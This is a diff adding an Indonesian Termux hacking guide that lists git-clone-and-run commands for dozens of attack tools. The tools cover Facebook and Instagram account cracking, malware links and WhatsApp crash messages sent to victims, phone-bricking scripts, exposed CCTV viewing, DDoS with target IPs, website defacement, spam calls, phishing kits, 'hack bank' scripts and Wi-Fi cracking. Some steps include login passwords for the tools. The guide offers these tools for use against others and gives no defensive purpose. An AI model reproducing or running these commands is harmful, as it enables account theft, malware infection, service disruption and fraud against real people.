@@ -1,0 +1,791 @@
+# BY MR VIRUS SPM
+# GUNAKAN PELAJARAN INI DENGAN BIJAK
+
+ ____  _   _ _  ___   _   _____ _____ ____  __  __ _   ___  __
+| __ )| | | | |/ / | | | |_   _| ____|  _ \|  \/  | | | \ \/ /
+|  _ \| | | | ' /| | | |   | | |  _| | |_) | |\/| | | | |\  /
+| |_) | |_| | . \| |_| |   | | | |___|  _ <| |  | | |_| |/  \
+|____/ \___/|_|\_\\___/    |_| |_____|_| \_\_|  |_|\___//_/\_\
+
+=============================================
+(+) AUTHOR    : MR VIRUS SPM              (+)
+(+) MY TIME   : MAVIA TEKNOLOGI INDONESIA (+)
+(+) INSTAGRAM : mvs.x_x                   (+)
+=============================================
+
+1). SCRIPT TERMUX HACK FB ( 9 SCRIPT )
+
+2). SCRIPT TERMUX VIRUS ( 4 SCRIPT )
+
+3). SCRIPT PERUSAK ( 3 SCRIPT )
+
+4). SCRIPT TERMUX HACK CCTV ( 2 SCRIPT )
+
+5). SCRIPT TERMUX DDOS ( 9 SCRIPT )
+
+6). SCRIPT TERMUX DEFACE ( 6 SCRIPT )
+
+7). SCRIPT TOOLS 1 TOLS BANYAK SCRIPT ( 11 SCRIPT )
+
+8). SCRIPT HACK FOLLOWING IG ( 1 SCRIPT )
+
+9). SCRIPT TERMUX HACK IG ( 6 SCRIPT )
+
+10). SCRIPT TERMUX CAMPURAN ( 11 SCRIPT )
+
+
+
+
+=================================================================
+🔥   _   _    _    ____ _  __  _____ ____
+🔥  | | | |  / \  / ___| |/ / |  ___| __ )
+🔥  | |_| | / _ \| |   | ' /  | |_  |  _ \
+🔥  |  _  |/ ___ \ |___| . \  |  _| | |_) |
+🔥  |_| |_/_/   \_\____|_|\_\ |_|   |____/
+
+
+  Untuk pertama kalian harus menginstal script di bawah ini
+
+$ apt update && apt upgrade
+
+$ pkg install python2
+
+$ pip2 install mechanize
+
+$ pip2 install requests
+
+$ pkg install git
+
+$ git clone https://github.com/aceptriana/fb
+
+$ cd fb
+
+$ python2 gas.py
+
+jika sudah anda bisa memasukkan nama anda 
+
+setelah itu masukan username dan password nya
+
+Username : Debo02
+Password : Intan02
+
+setelah itu anda login menggunakan Facebook anda 
+setelah selasai baru anda bisa meng hack fb selamat mencoba
+ingat selalu gunakan dengan bijak:)
+
+script fb yg lain
+
+$ pkg install git python2
+$ pip2 install requests
+$ git clone https://github.com/Bl4ckDr460n/Black-Fb-Premium
+$ cd Black-Fb-Premium
+$ python2 Black-Fb.py
+
+
+$pkg update && pkg upgrade -y
+$pkg install python2
+$pkg install git 
+$git clone https://github.com/rezadkim/MBFz
+$cd MBFz
+$pip2 install -r nganunymous.txt
+$pip2 install mechanize
+$pip2 install progress 
+$python2 mbfz.py
+
+
+$ pkg update && pkg upgradeupgrade
+$ pkg install python2
+$ pip2 install requests
+$ pip2 install mechanize
+$ pkg install git
+$ git clone https://github.com/ARIYA-CYBER/NEW
+$ cd NEW
+$ python2 FbNew.py
+
+*🔰TOOLS HACK FB TEMAN🔰*
+
+$ apt update && apt upgrade
+$ pip2 install --upgrade pip
+$ pip2 install requests
+$ pip2 install mechanize
+$ pkg install git
+$ git clone https://github.com/blackcodercrush/hack-facebook-teman
+$ cd hack-facebook-teman
+$ sh requests.sh
+$ python2 hack-fb.py
+
+
+*🔰Hack Facebook target 🔰*
+
+$ apt update && apt upgrade
+$ apt install git
+$ apt install python2
+$ pip2 install mechanize
+$ git clone https://github.com/FR13ND8/BRUTEFORCEnew
+$ cd BRUTEFORCEnew
+$ sh new.sh
+
+*🔰Hack Facebook Terbaru🔰*
+
+$ apt update && apt upgrade
+$ pkg ins toilet
+$ pkg ins figlet
+$ pkg ins ruby
+$ pkg ins gem
+$ gem ins lolcat
+$ pkg ins php
+$ pkg ins python2
+$ pkg ins git
+$ git clone https://github.com/Rusmana-ID/rus,
+$ cd rus
+$ sh v2.sh
+
+rename: Anak
+pw: Bangsa
+
+*🔰TOOLS SADAP🔰*
+
+$ apt update && apt upgrade
+$ apt install php git
+$ apt install bash
+$ git clone https://github.com/MrTamfanX/TamfanFacebook
+$ cd TamfanFacebook
+$ chmod +x *
+$ chmod -R 775 lib
+$ sh install.sh
+$ sh tamfan.sh
+
+🔰 Hack Fb Target New
+pkg install git
+pkg install python2
+pip2 install --upgrade pip
+pip2 install mechanize
+git clone https://github.com/MRA27/FBNEWV2
+cd FBNEWV2
+python2 MRA27.py
+100003191711187
+
+=================================================================
+🔥 __     _____ ____  _   _ ____
+🔥 \ \   / /_ _|  _ \| | | / ___|
+🔥  \ \ / / | || |_) | | | \___ \
+🔥   \ V /  | ||  _ <| |_| |___) |
+🔥    \_/  |___|_| \_\\___/|____/
+
+🔰 VIRUS LINK
+$ pkg update && pkg upgrade
+$ pkg install figlet
+$ pkg install git
+$ git clone https://github.com/MrVirusSpm-07/link-virus
+$ cd link-virus
+$ sh download.sh
+  
+  virus Link adalah link yang berisi aplikasi virus di mana 
+aplikasi ini mengandung Malware.
+jadi cara kerjanya adalah dengan anda mengirim kan link yg sudah 
+di anjurkan script,
+ke korban dan jika korban mau mencet link tersebut, maka secara 
+otomatis si korban langsung di tuju ke aplikasi nya dan langsung
+menginstal aplikasi virusnya
+
+🔰 VIRUS VIRTEX
+$ pkg update && pkg upgrade
+$ pkg install figlet
+$ pkg install git
+$ git clone https://github.com/MrVirusSpm-07/virtex
+$ cd virtex
+$ sh virtex-x.sh
+
+   Virtex adalah virus virtex khusus whatsap yg dimana bisa membuat.
+WhatsApp lag bahkan sampai tidak bisa di buka sama sekali,
+
+  Oh iya jika anda mau mengirim virus sini langkah baiknya anda
+menggunakan whatsap imune.
+
+🔰 VIRUS VBUG
+
+$ pkg update && pkg upgrade
+$ pkg install git
+$ pkg install python
+$ pkg install python2
+$ termux-setup-storage
+$ git clone https://github.com/Gameye98/vbug
+$ cd vbug
+$ python2 vbug.py
+
+ketik nomor 1/01
+untuk contoh saya memilih virus mobilegen
+ketik [ MOB ]
+VIBUM => anvima MOB
+
+jika sudah terinstall ketikan perintah
+
+cd vbug
+mv namavirus.apk cd /sdcard/
+
+namavirus maksudnya nama virus yh tandi anda buat
+contoh = mv mobelejen.apk cd /sdcard/
+
+🔰 VIRUS MOD
+$ pkg update && pkg upgrade
+$ pkg install php
+$ pkg install git
+$ pkg install nano 
+$ git clone https://github.com/radenvodka/cashtree
+$ cd cashtree
+$ nano cashtree.php
+$ php cashtree.php
+
+=================================================================
+🔥  ____  _____ ____  _   _ ____    _    _  __
+🔥 |  _ \| ____|  _ \| | | / ___|  / \  | |/ /
+🔥 | |_) |  _| | |_) | | | \___ \ / _ \ | ' /
+🔥 |  __/| |___|  _ <| |_| |___) / ___ \| . \
+🔥 |_|   |_____|_| \_\\___/|____/_/   \_\_|\_\
+
+🔰 JUSTAK HACKER
+$ pkg update && pkg upgrade
+$ pkg install python
+$ pkg install python2
+$ pkg install git
+$ pkg install requests
+$ git clone https://github.com/justahackers/perusak
+$ cd perusak
+$ python2 perusak.py
+
+
+ Tools perusak hp adalah script termux yang memiliki fungsi untuk 
+membuat hp menjadi bermasalah, contohnya ngelag, ngeblank bahkan 
+sampai bootloop.
+
+🔰 VIRUS HP
+$ pkg update && pkg upgrade 
+$ pkg install bash
+$ pkg install git 
+$ git clone https://github.com/novalattasya/6VIRUS
+$ cd 6VIRUS
+$ sh 6VIRUS.sh
+
+🔰 TROJANS
+$ apt update && apt upgrade
+$ pkg install python2
+$ pip2 install mechanize
+$ pip2 install request
+$ pkg install git
+$ git clone https://github.com/R133F/Trojans
+$ cd Trojans
+$ python2 trojans.py
+
+=================================================================
+🔥  _   _    _    ____ _  __   ____ ____ _______     __
+🔥 | | | |  / \  / ___| |/ /  / ___/ ___|_   _\ \   / /
+🔥 | |_| | / _ \| |   | ' /  | |  | |     | |  \ \ / /
+🔥 |  _  |/ ___ \ |___| . \  | |__| |___  | |   \ V /
+🔥 |_| |_/_/   \_\____|_|\_\  \____\____| |_|    \_/
+
+🔰 IPCS
+$ pkg update && pkg upgrade 
+$ pkg install python2 -y
+$ pkg install git -y
+$ git clone https://github.com/Kancotdiq/ipcs
+$ cd ipcs
+$ pip2 install requests
+$ python2 scan.py
+
+- pilih nomor negara mana
+- setelah itu muncul ip address silahkan anda copy
+- tempel ke google
+
+
+ Ipcs adalah script termux hack cctv vuln atau rentan akan keamanan.
+jadi anda dengan mudah mampu melihat cctv tersebut
+
+🔰 HACK CCTV NEGARA
+$ apt-get install python3
+$ apt-get install git
+$ git clone https://github.com/AngelSecurityTeam/Cam-Hackers
+$ pip3 install requests
+$ pip3 install colorama
+$ cd Cam-Hackers
+$ python3 cam-hackers.py
+
+=================================================================
+
+🔥  ____  ____   ___  ____       _  _____ _____  _    ____ _  __
+🔥 |  _ \|  _ \ / _ \/ ___|     / \|_   _|_   _|/ \  / ___| |/ /
+🔥 | | | | | | | | | \___ \    / _ \ | |   | | / _ \| |   | ' /
+🔥 | |_| | |_| | |_| |___) |  / ___ \| |   | |/ ___ \ |___| . \
+🔥 |____/|____/ \___/|____/  /_/   \_\_|   |_/_/   \_\____|_|\_\
+
+🔰 BY MR VIRUS SPM
+$ pkg update && pkg upgrade
+$ pkg install python
+$ pkg install figlet
+$ pkg install git
+$ git clone https://github.com/MrVirusSpm-07/ddos-attack
+$ cd ddos-attack
+$ python attack-ddos.py
+
+🔰 DDOS VIRUS DROID
+$ apt update && apt upgrade
+$ apt install git toilet
+$ apt install python
+$ apt install python2
+$ git clone https://github.com/banghyuu/ddosWD
+$ cd ddosWD
+$ sh Ddos.sh
+
+🔰 DDOS ATTACK
+$pkg update && pkg upgrade
+$pkg install git -y
+$pkg install python2 -y
+$git clone https://github.com/kumpulanremaja/ddos2
+$cd ddos2
+$python2 ddos.py ipadres -p 80 -t 135
+
+🔰 DDOS BY.BLACKCYC
+$ pkg update && pkg upgrade
+$ pkg install git
+$ git clone https://github.com/BlackCyberAnonim/B-ATTACKING
+$ cd B-ATTACKING
+$ sh install.Sh
+
+🔰 VANESSA ANGGEL DDOS
+$ pkg update && pkg upgrade
+$ pkg install git
+$ pkg install python2
+$ git clone https://github.com/MiSetya/VA-DDOS
+$ cd VA-DDOS
+$ chmod +x 80juta.py
+$ python2 80juta.py
+
+🔰 DDOS HULK (1)
+$ apt update && upgrade
+$ pkg install git
+$ pkg install python
+$ git clone https://github.com/Mr4FX/HULK
+$ cd HULK
+$ chmod +x hulk.py
+$ python hulk.py
+
+🔰 ddos lucita
+$ apt update && apt upgrade
+$ pkg install git
+$ pkg install python
+$ git clone https://github.com/zlucifer/lucita_ddos
+$ cd lucita_ddos
+$ python pukul.py
+
+🔰 DDOS MCI
+$ apt update && apt upgrade
+$ apt install python
+$ apt install python2
+$ apt install git
+$ git clone https://github.com/MrTamfanX/MCIDDOS
+$ cd MCIDDOS
+$ python2 TamfanDdos.py
+$ python2 TamfanDdos.py IPTarget 8080 100000
+
+🔰 DDOS HULK (2)
+$ apt update && apt upgrade
+$ apt install git 
+$ apt install python2
+$ git clone https://github.com/grafov/hulk
+$ cd hulk
+$ chmod +x *
+$ python2 hulk.py urltarget
+
+DDoS singkatan dari (Distributed Denial of Service) atau bisa 
+disebut dengan Penolakan Layanan secara Terdistribusi. Aktivitas 
+DDoS Termux adalah jenis serangan yang dilakukan untuk mengirim 
+request dan file tertetu ke lalu lintas jaringan internet pada 
+server, sistem, atau jaringan.
+
+=================================================================
+
+🔥  ____  _____ _____ _    ____ _____ ____
+🔥 |  _ \| ____|  ___/ \  / ___| ____|  _ \
+🔥 | | | |  _| | |_ / _ \| |   |  _| | |_) |
+🔥 | |_| | |___|  _/ ___ \ |___| |___|  _ <
+🔥 |____/|_____|_|/_/   \_\____|_____|_| \_\
+
+🔰 DEFACE KINDEDITOR
+$ pkg update && pkg upgrade
+$ pkg install figlet
+$ pkg install git
+$ git clone https://github.com/MrVirusSpm-07/depes
+$ cd depes
+$ sh pengingat.sh
+
+🔰 DEFACE ELFINDER
+$ pkg update && pkg upgrade
+$ pkg install figlet
+$ pkg install git
+$ git clone https://github.com/MrVirusSpm-07/elfinder
+$ cd elfinder
+$ sh depes-pm.sh
+
+🔰 DEFACE FILE HOSTING
+$ pkg update && pkg upgrade
+$ pkg install git
+$ pkg install figlet
+$ git clone https://github.com/MrVirusSpm-07/hosting
+$ cd hosting
+$ sh depespoc.sh
+
+🔰 SCRIPT DEFACER
+$ pkg update && pkg upgrade
+$ pkg install git
+$ pkg install figlet
+$ git clone https://github.com/MrVirusSpm-07/tool-deface
+$ cd tool-deface
+$ sh defacer.sh
+
+🔰 DEFACE UPLOAD SCRIPT PART 1
+$ pkg update && pkg upgrade
+$ pkg install figlet
+$ pkg install git
+$ git clone https://github.com/MrVirusSpm-07/upload-01
+$ cd upload-01
+$ sh sc-pepes.sh
+
+🔰 DEFACE UPLOAD SCRIPT PART 2
+$ pkg update && pkg upgrade
+$ pkg install figlet
+$ pkg install git
+$ git clone https://github.com/MrVirusSpm-07/upload-02
+$ cd upload-02
+$ sh depes02.sh
+
+=================================================================
+
+🔥  ____   ____ ____  ___ ____ _____   _____ ___  _     ____
+🔥 / ___| / ___|  _ \|_ _|  _ \_   _| |_   _/ _ \| |   / ___|
+🔥 \___ \| |   | |_) || || |_) || |     | || | | | |   \___ \
+🔥  ___) | |___|  _ < | ||  __/ | |     | || |_| | |___ ___) |
+🔥 |____/ \____|_| \_\___|_|    |_|     |_| \___/|_____|____/
+
+🔰 TOLS TUANBADUT
+$ apt update && apt upgrade -y
+$ apt install git
+$ apt install php
+$ apt install curl
+$ apt install ruby
+$ apt install figlet
+$ apt install python2
+$ gem install lolcat
+$ git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv3
+$ cd TOOLSINSTALLERv3
+$ chmod +x TUANB4DUT.sh
+$ sh TUANB4DUT.sh
+
+🔰 TOLS BAJINGAN
+$ apt install update
+$ apt instal upgrade
+$ pip2 instal termcolor
+$ pip2 instal lolcat
+$ apt install toilet
+$ apt install git
+$ git clone https://github.com/DarknessCyberTeam/BAJINGANv6
+$ cd BAJINGANv6
+$ sh BAJINGAN.sh
+
+Untuk Nama Pengguna: BAJINGAN
+Kata Sandi: Gans
+
+🔰 TOLS DARFLY
+$ apt-get update
+$ apt-get upgrade
+$ pkg install python
+$ pkg install python2
+$ pkg install git
+$ git clone https://github.com/Ranginang67/DarkFly-Tool
+$ cd DarkFly-Tool
+$ chmod +x *
+$ python2 install.py
+
+🔰 TOLS WORK
+$ pkg update && pkg upgrade
+$ pkg install toilet
+$ pkg install git
+$ git clone https://github.com/MrVirusSpm-07/work-maret-2021
+$ cd work-maret-2021
+$ sh mrviruswork.sh
+
+🔰 TOLS 25 SCRIPT
+$ pkg update && pkg upgrade
+$ pkg install figlet
+$ pkg install git
+$ git clone https://github.com/MrVirusSpm-07/25script
+$ cd 25script
+$ sh toolsking.sh
+
+🔰 TOLS ID
+$ pkg update && pkg upgrade
+$ apt-get install ruby -y
+$ gem install lolcat
+$ pkg install figlet
+$ pkg install git
+$ https://github.com/Rendi-ID/tools-ID
+$ cd tools-ID
+$ sh tools.sh
+
+🔰 TOLS SEDERHANA
+$ pkg update && pkg upgrade
+$ pkg install git
+$ git clone https://github.com/KANG-NEWBIE/toolsederhana2
+$ cd toolsederhana2
+$ python2 sederhana.py
+
+🔰 TOLS 15
+$ pkg update && pkg upgrade
+$ pkg install git
+$ git clone https://github.com/banghyuu/TooL15
+$ cd TooL15
+$ sh 15.sh
+
+🔰 TOLS V1
+$ pkg update && pkg upgrade
+$ pkg install git
+$ pkg install figlet
+$ pkg install ruby
+$ pkg install toilet
+$ gem install lolcat
+$ git clone https://github.com/MR-L4M3R/Tools-V1
+$ cd Tools-V1
+$ sh tools.sh
+
+🔰 TOLS INSTALLER
+$ pkg update
+$ pkg upgrade
+$ pkg install git
+$ pkg install figlet
+$ git clone https://github.com/MR-L4M3R/Tools
+$ cd Tools
+$ sh Bewandek.sh
+
+🔰 TOOL SPAM CALL
+$ pkg update && pkg upgrade
+$ pkg install bash
+$ pkg install git
+$ git clone https://github.com/MrVirusSpm-07/6spam
+$ cd 6spam
+$ bash 6call.sh
+
+ script termux tools adalah script termux satu tools isi banyak
+script, jadi dengan tools ini bisa mempermudah anda. agar tidak
+susah menginstal script
+
+=================================================================
+
+🔥  _____ ___  _     _____        _____ _   _  ____
+🔥 |  ___/ _ \| |   / _ \ \      / /_ _| \ | |/ ___|
+🔥 | |_ | | | | |  | | | \ \ /\ / / | ||  \| | |  _
+🔥 |  _|| |_| | |__| |_| |\ V  V /  | || |\  | |_| |
+🔥 |_|   \___/|_____\___/  \_/\_/  |___|_| \_|\____|
+
+🔰 INSFOLOW
+$ pkg up -y
+$ pkg install git -y
+$ pkg install openssl-tool
+$ pkg install curl -y
+$ git clone https://github.com/termuxprofessor/insfollow
+$ cd insfollow 
+$ chmod +x insfollow.sh
+$ bash insfollow.sh
+
+ Script insfolow adalah script termux yg mampu membuat followers
+kita naik secara otomatis, nama hanya bisa di gunakan sekali saja
+buat satu akun.
+
+=================================================================
+
+🔥  _   _    _    ____ _  __  ___ ____
+🔥 | | | |  / \  / ___| |/ / |_ _/ ___|
+🔥 | |_| | / _ \| |   | ' /   | | |  _
+🔥 |  _  |/ ___ \ |___| . \   | | |_| |
+🔥 |_| |_/_/   \_\____|_|\_\ |___\____|
+
+🔰 DARKCURUT
+$ pkg install nano
+$ pkg install figlet
+$ pkg install python2
+$ pip2 install lolcat
+$ pkg install cowsay
+$ pkg install git
+$ git clone https://github.com/darkcurut08/darkcurut08
+$ cd darkcurut08
+$ sh Moreno77.sh
+
+🔰 MULTIMBF
+$ pkg update && pkg upgrade
+$ pkg install git
+$ pkg install jq -y
+$ git clone https://github.com/noolep/multiBF_ig
+$ cd multiBF_ig
+$ bash brute.sh
+
+🔰 INSTAFUCER
+$ pkg install git
+$ pkg install nano
+$ pkg install bash
+$ pkg install tor
+$ git clone https://github.com/aryanrtm/instafuck3r
+$ cd instafuck3r 
+$ chmod +x instafuck3r.sh
+
+🔰 HEK IG
+$ pkg install python2
+$ pkg install openssh
+$ pkg install git
+$ git clone https://github.com/saydog/HEK-IG
+$ cd HEK-IG
+$ python2 dog.py
+
+🔰 INSTAHACK
+$ apt update && apt upgrade
+$ pkg install bash
+$ pkg install python2
+$ pkg install nano
+$ pkg install cowsay
+$ pkg install lolcat
+$ pkg install figlet
+$ pkg install git
+$ pip2 install requests
+$ pip2 install mechanize
+$ git clone https://github.com/storiku/instahack
+$ cd instahack
+$ bash ig.sh
+
+🔰 IG-HACK
+$ pkg upgrade && pkg update
+$ pkg install python -y
+$ pkg install php -y
+$ pkg install Apache2 -y
+$ pkg install curl -y
+$ pkg install bash -y
+$ pkg install jq -y
+$ pkg install git -y
+$ git clone https://github.com/JExCoders/IG-Hack 
+$ cd IG-Hack
+$ bash ighack.sh
+
+=================================================================
+
+🔥  ____    _    __  __ ____  _   _ ____      _    _   _
+🔥 / ___|  / \  |  \/  |  _ \| | | |  _ \    / \  | \ | |
+🔥| |     / _ \ | |\/| | |_) | | | | |_) |  / _ \ |  \| |
+🔥| |___ / ___ \| |  | |  __/| |_| |  _ <  / ___ \| |\  |
+🔥 \____/_/   \_\_|  |_|_|    \___/|_| \_\/_/   \_\_| \_
+
+🔰 NIK DAN KK GRATIS
+$ pkg install php git
+$ git clone https://github.com/IndonesiaSecurity/kkktp
+$ cd kkktp
+$ php kkktp.php
+
+🔰 MELACAK IP
+$ git clone https://github.com/maldevel/IPGeolocation
+$ cd IPGeolocation
+$ chmod +x ipgeolocation.py
+$ pip install -r requirements.txt
+$ python ipgeolocation.py -m
+$ python ipgeolocation.py -t IPnya
+
+🔰 PEMULA TERMUX
+$ apt update && apt upgrade
+$ apt install figlet
+$ apt install git
+$ git clone https://github.com/MrVirusSpm-07/pelater
+$ cd pelater
+$ sh pemula.sh
+
+🔰 JUZ AM'MA
+$ pkg update && pkg upgrade
+$ pkg install git
+$ git clone https://github.com/MrVirusSpm-07/juz-amma
+$ cd juz-amma
+$ sh amma.sh
+
+🔰 HACKED  KONTAK
+$ apt update && apt upgrade
+$ apt install figlet
+$ apt install git
+$ git clone https://github.com/MrVirusSpm-07/hack
+$ cd hack
+$ sh cans.sh
+$ Pilih nomor : 2
+$ cd mrvirus
+$ sh gipwy.sh
+
+🔰 Hack Bank
+$ apt update && apt upgrade
+$ apt install php
+$ apt install git
+$ git clone https://github.com/MrUncle/Script-HackBank
+$ cd Script-HackBank
+$ chmod +x *
+$ sh ALLBANK
+
+🔰 zpihiser
+$ apt update && apt upgrade
+$ pkg install git -y
+$ pkg install php -y
+$ pkg install openssh -y
+$ pkg install curl -y
+$ git clone https://github.com/htr-tech/zphisher
+$ cd zphisher
+$ chmod +x zphisher.sh
+$ bash zphisher.sh
+
+🔰 SCRIPT TERMUX SANTET
+$ apt update && apt upgrade
+$ apt install git
+$ git clone https://github.com/banghyuu/SantetHalus
+$ cd SantetHalus
+$ sh install.sh
+$ sh santet.sh
+pasword = mrzhu
+
+🔰 MERUBAH TAMPILAN TERMUX
+$ pkg install git -y
+$ pkg install python2 -y
+$ git clone https://github.com/Inject-ID/tampilan-termux-v2
+$ cd tampilan-termux-v2
+$ python2 run.py
+
+🔰 PHISING
+$ apt-get update && apt-get upgrade
+$ apt-get install git
+$ apt-get install python python-pip python-setuptools
+$ pip install scapy
+$ git clone https://github.com/wifiphisher/wifiphisher.git
+$ cd wifiphisher<
+$ python setup.py install
+$ cd wifiphisher
+$ python wifiphisher
+
+
+🔰HACK WIFI Termux
+$ apt update
+$ apt upgrade
+$ apt install git
+$ git clone https://github.com/esc0rtd3w/wifi-hacker
+$ ls
+$ cd wifi-hacker
+$ ls
+$ chmod +x wifi-hacker.sh
+$ ls
+$ ./wifi-hacker.sh
+
+
+
+
+
+
+
+
+
+
+
+
